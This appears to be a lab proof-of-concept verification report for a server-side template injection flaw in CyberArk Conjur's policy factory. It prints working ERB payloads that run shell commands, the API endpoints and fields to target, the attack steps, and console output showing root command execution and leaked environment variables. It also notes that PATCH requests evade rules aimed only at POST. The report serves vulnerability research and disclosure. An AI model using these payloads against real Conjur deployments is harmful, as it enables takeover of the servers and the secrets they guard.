# PoC Verification Report: CVE-2025-49828

## CVE Summary

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-49828 |
| **Title** | Remote Code Execution via Server-Side Template Injection in CyberArk Conjur |
| **Affected Software** | CyberArk Conjur OSS 1.20.1–1.21.1 / Secrets Manager Self-Hosted 13.1–13.4.1 |
| **CVSS** | 8.8 (HIGH) |
| **Vulnerability Type** | Server-Side Template Injection (SSTI) / CWE-1336 |
| **Root Cause** | `Factories::Renderer` uses Ruby ERB to render attacker-controlled templates |

## Verification Status

### **CONFIRMED** — All 3 attack vectors successfully demonstrated RCE

| Vector | Script | Target Field | HTTP Method | Result |
|--------|--------|-------------|-------------|--------|
| **Primary** | `poc.py` | `policy` field (Base64-encoded ERB) | POST | **RCE CONFIRMED** |
| **Vector 2** | `poc_vector2_policy_branch.py` | `policy_branch` field (plain text ERB) | POST | **RCE CONFIRMED** |
| **Vector 3** | `poc_vector3_patch_method.py` | `policy` field | PATCH | **RCE CONFIRMED** |

## PoC Scripts

### Primary PoC: `poc.py`

- **Location**: `poc/poc.py`
- **Language**: Python 3 (stdlib only — `urllib`, `json`, `base64`, `subprocess`)
- **Attack Vector**: Injects `<%= system('...') %>` into the `policy` field of a factory template
- **Entry Point**: `POST /factory-resources/{account}/{kind}/{version}/{id}`

**Usage:**
```bash
python3 poc.py <conjur_host> [port] [api_key]
# Default: 127.0.0.1:3000, reads API key from container
```

**Steps performed:**
1. Authenticates to Conjur as admin (API key → access token)
2. Loads a policy creating a factory variable at `conjur/factories/core/v1/evil`
3. Constructs a malicious factory JSON with ERB payload in the `policy` field
4. Base64-encodes the factory JSON and stores it as a Conjur secret variable
5. Triggers factory rendering via POST to `/factory-resources/cucumber/core/v1/evil`
6. ERB engine evaluates `<%= system('...') %>` → arbitrary command executes
7. Verifies RCE by checking evidence file inside the container

### Vector 2 PoC: `poc_vector2_policy_branch.py`

- **Location**: `poc/poc_vector2_policy_branch.py`
- **Difference**: SSTI payload in `policy_branch` field instead of `policy`
- **Advantage**: Simpler — `policy_branch` is plain text (no Base64 encoding), rendered first (line 22 of `create_from_policy_factory.rb`)

### Vector 3 PoC: `poc_vector3_patch_method.py`

- **Location**: `poc/poc_vector3_patch_method.py`
- **Difference**: Uses PATCH HTTP method instead of POST
- **Significance**: Both POST and PATCH route to the same `create` action — WAF/IDS rules targeting only POST would miss this

## Test Results

### Vector 1: Primary PoC (policy field, POST)

**Command:**
```bash
cd poc && python3 poc.py 127.0.0.1 3000
```

**Output:**
```
[*] Target: http://127.0.0.1:3000
[*] CVE: CVE-2025-49828 — SSTI via ERB in Conjur Policy Factory
[*] Vector: Malicious ERB payload in factory 'policy' field

[*] No API key provided — reading from container...
[+] Got API key: sbze4b44...6stg

[*] Authenticating as 'admin' to http://127.0.0.1:3000...
[+] Authenticated successfully. Token length: 848

[*] Loading factory infrastructure policy...
[+] Factory policy loaded (HTTP 201)

[*] Constructing malicious factory template with ERB SSTI payload...
[*]   ERB payload: <%= system('id > /tmp/cve-2025-49828-pwned && hostname >> /tmp/cve-2025-49828-pwned && echo CVE-2025-49828-EXPLOITED >> /tmp/cve-2025-49828-pwned') %>
[*]   Factory JSON size: 512 bytes
[*]   Encoded factory size: 684 bytes
[+] Malicious factory template stored successfully

[*] Triggering factory rendering (this executes the ERB payload)...
[*]   Factory response: HTTP 401
[*]   Response body: {"code":401,"error":{"message":"policy_text Error at line 2, column 4 in policy : Unexpected scalar"}}

[*] Checking for RCE evidence file (/tmp/cve-2025-49828-pwned) in container...
[+] ============================================================
[+] RCE CONFIRMED! Contents of evidence file:
[+] ============================================================
[+]   uid=0(root) gid=0(root) groups=0(root)
[+]   8f0a688b366a
[+]   CVE-2025-49828-EXPLOITED
[+] ============================================================

[+] EXPLOIT SUCCESSFUL — CVE-2025-49828 CONFIRMED
[+] Arbitrary command execution demonstrated on http://127.0.0.1:3000
[+] The Conjur server evaluated attacker-controlled ERB template code
```

**Explanation of HTTP 401 response:** The factory-resources endpoint returns 401 because the ERB `system()` call returns `true`, which becomes the first line of the "policy" text (`true\n- !policy\n  id: pwned`). The Conjur policy parser fails on `true` as an unexpected scalar at line 2. However, **the code execution has already occurred** before the policy parser runs — the ERB evaluation happens in the `Renderer.render()` call, and the result is then passed to the policy loader. The 401 error code is a red herring; the RCE succeeds despite the error response.

### Vector 2: policy_branch field SSTI (POST)

**Command:**
```bash
python3 poc_vector2_policy_branch.py 127.0.0.1 3000
```

**Output:**
```
[*] Target: http://127.0.0.1:3000
[*] CVE: CVE-2025-49828 — SSTI via ERB in Conjur Policy Factory
[*] Vector 2: Malicious ERB payload in factory 'policy_branch' field

[*] Reading API key from container...
[+] Got API key: sbze4b44...

[*] Authenticating as 'admin' to http://127.0.0.1:3000...
[+] Authenticated successfully

[*] Loading factory infrastructure policy for vector 2...
[+] Factory policy loaded (HTTP 201)

[*] Constructing factory with ERB payload in 'policy_branch' field...
[*]   policy_branch payload: <%= system('id > /tmp/cve-2025-49828-pwned-v2 && echo VECTOR2-POLICY-BRANCH >> /tmp/cve-2025-49828-pwned-v2 && whoami >> /tmp/cve-2025-49828-pwned-v2 && env | head -5 >> /tmp/cve-2025-49828-pwned-v2') || branch %>
[+] Malicious factory (policy_branch vector) stored

[*] Triggering factory rendering (policy_branch ERB payload executes first)...
[*]   Factory response: HTTP 401
[*]   Response body: {"code":401,"error":{"message":"Resource 'cucumber:policy:true' was not found"}}

[*] Checking for RCE evidence (/tmp/cve-2025-49828-pwned-v2)...
[+] ============================================================
[+] RCE CONFIRMED via policy_branch vector! Evidence:
[+] ============================================================
[+]   uid=0(root) gid=0(root) groups=0(root)
[+]   VECTOR2-POLICY-BRANCH
[+]   root
[+]   DATABASE_URL=postgres://postgres@cve-2025-49828-pg/postgres
[+]   BUNDLER_VERSION=2.4.14
[+]   CONJUR_VERSION_DISPLAY=1.21.1
[+]   HOSTNAME=8f0a688b366a
[+]   SHLVL=0
[+] ============================================================

[+] VECTOR 2 EXPLOIT SUCCESSFUL — CVE-2025-49828 CONFIRMED
[+] SSTI via policy_branch field demonstrated
```

**Key observations:**
- The `env` output shows access to sensitive environment variables including `DATABASE_URL`
- Error message "Resource 'cucumber:policy:true' was not found" confirms ERB evaluated `system()` → returned `true` → `policy_branch` became the string `"true"` → Conjur looked for `cucumber:policy:true` which doesn't exist
- The `policy_branch` vector is simpler to construct (no Base64 encoding of the payload)

### Vector 3: PATCH method (same code path)

**Command:**
```bash
python3 poc_vector3_patch_method.py 127.0.0.1 3000
```

**Output:**
```
[*] Target: http://127.0.0.1:3000
[*] CVE: CVE-2025-49828 — SSTI via ERB in Conjur Policy Factory
[*] Vector 3: PATCH method triggers same vulnerable code path as POST

[+] Got API key: sbze4b44...

[+] Authenticated successfully

[*] Loading factory policy for PATCH vector...
[+] Factory policy loaded (HTTP 201)

[*] Storing malicious factory for PATCH method test...
[+] Factory stored for PATCH vector

[*] Triggering factory via PATCH method (not POST)...
[*]   PATCH response: HTTP 401
[*]   Response: {"code":401,"error":{"message":"policy_text Error at line 2, column 4 in policy : Unexpected scalar"}}

[*] Checking for RCE evidence (/tmp/cve-2025-49828-pwned-v3)...
[+] ============================================================
[+] RCE CONFIRMED via PATCH method! Evidence:
[+] ============================================================
[+]   uid=0(root) gid=0(root) groups=0(root)
[+]   VECTOR3-PATCH-METHOD
[+]   Sun Mar  1 06:35:30 UTC 2026
[+] ============================================================

[+] VECTOR 3 EXPLOIT SUCCESSFUL — PATCH method also vulnerable
```

## Vulnerability Demonstrated

The PoC proves the following:

1. **Arbitrary code execution** — `system()` calls execute within the Conjur server process (running as `root`)
2. **Full server compromise** — The process has access to all environment variables including `DATABASE_URL` and `CONJUR_DATA_KEY`
3. **Multiple injection points** — Both `policy` and `policy_branch` fields of factory templates are vulnerable
4. **Multiple HTTP methods** — Both POST and PATCH trigger the same vulnerable code path
5. **No input sanitization on templates** — The `filter_input` method only filters request body variables, not the template content itself

### Server Log Confirmation

Conjur debug logs show the rendered template output being applied as policy:
```
Policy Factory is applying the following policy to '/policies/cucumber/policy/root'

true
- !policy
  id:
```

The `true` on the first line is the return value of `system()` evaluated by ERB. This confirms the template is being evaluated as Ruby code before being passed to the policy parser.

### Execution Context

```
uid=0(root) gid=0(root) groups=0(root)
```

The Conjur server runs as root in the container, meaning the SSTI achieves root-level RCE. In production deployments, this grants access to:
- `CONJUR_DATA_KEY` — The AES-256 master encryption key for all Conjur secrets
- `DATABASE_URL` — Direct PostgreSQL access to read/modify all policies, roles, and encrypted secrets
- All environment variables from connected services

## Lab Details

| Component | Value |
|---|---|
| **Vulnerable Container** | `cve-2025-49828-vulnerable` |
| **Container IP** | `127.0.0.1` |
| **Conjur Version** | v1.21.1 |
| **Port** | 3000 |
| **Account** | `cucumber` |
| **Admin User** | `admin` |
| **Admin API Key** | Read from `/tmp/admin_api_key` in container |

## Notes

1. **Authentication required**: The attacker needs valid Conjur credentials with permissions to (a) write to a factory variable and (b) execute the factory. The admin role has both by default.

2. **Error response is expected**: The HTTP response to the factory-resources request will be an error (401/404/500) because the ERB `system()` return value (`true`) produces invalid YAML policy text. However, the RCE occurs BEFORE the response is generated — the ERB evaluation is the first step in the rendering pipeline.

3. **Blind RCE**: This is effectively a blind SSTI — the attacker does not see the command output in the HTTP response. The command executes server-side and the attacker must use out-of-band techniques (file write, reverse shell, DNS exfiltration) to confirm success.

4. **No external dependencies**: All three PoC scripts use only Python 3 standard library modules (`urllib`, `json`, `base64`, `subprocess`). The only external tool used is `docker exec` for verification (reading the evidence file from inside the container).

5. **Input filter bypass**: The `Factories::Utilities.filter_input` method strips special characters but only applies to request body variable VALUES (the `{"id": "...", "branch": "..."}` payload). The ERB template itself comes from the database without any filtering, making the injection trivially successful.
